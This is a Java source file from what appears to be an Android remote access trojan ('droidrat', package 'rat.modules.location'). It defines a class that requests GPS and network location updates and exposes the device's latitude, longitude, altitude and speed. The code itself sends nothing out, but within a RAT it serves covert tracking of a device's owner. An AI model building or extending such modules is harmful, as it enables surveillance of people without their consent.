package com.je_chen.droidrat_je.rat.modules.location;

import android.annotation.SuppressLint;
import android.location.Criteria;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;

import androidx.annotation.NonNull;

public class LocationSystem implements LocationListener {

    private LocationManager locationManager;
    private String provider;

    private double altitude, latitude, longitude, speed;

    private String type;
    private int sec, meter;

    @SuppressLint("MissingPermission")
    public LocationSystem(LocationManager locationManager, String type, int sec, int meter) {
        this.locationManager = locationManager;
        this.type = type;
        this.sec = sec;
        this.meter = meter;
        provider = locationManager.getBestProvider(new Criteria(), true);
        if(provider != null)
            locationManager.requestLocationUpdates(type, sec, meter, this);
    }


    @Override
    public void onLocationChanged(@NonNull Location location) {
        altitude = location.getAltitude();
        latitude = location.getLatitude();
        longitude = location.getLongitude();
        speed = location.getSpeed();
    }

    @Override
    protected void finalize() throws Throwable {
        super.finalize();
        if(provider != null)
            locationManager.removeUpdates(this);
    }

    @SuppressLint("MissingPermission")
    public Location getLastKnownLocation(String type) {
        switch (type) {
            case "gps":
                return locationManager.getLastKnownLocation("gps");
            case "network":
                return locationManager.getLastKnownLocation("network");
        }
        return locationManager.getLastKnownLocation("gps");
    }

    public boolean canUse(){
        return this.provider == null;
    }

    public String getProvider() {
        return provider;
    }

    public double getAltitude() {
        return altitude;
    }

    public double getLatitude() {
        return latitude;
    }

    public double getLongitude() {
        return longitude;
    }

    public double getSpeed() {
        return speed;
    }

    public int getSec() {
        return sec;
    }

    public int getMeter() {
        return meter;
    }

    public void removeUpdates() {
        locationManager.removeUpdates(this);
    }

    @SuppressLint("MissingPermission")
    public void requestUpdate() {
        locationManager.requestLocationUpdates(type, sec, meter, this);
    }
}
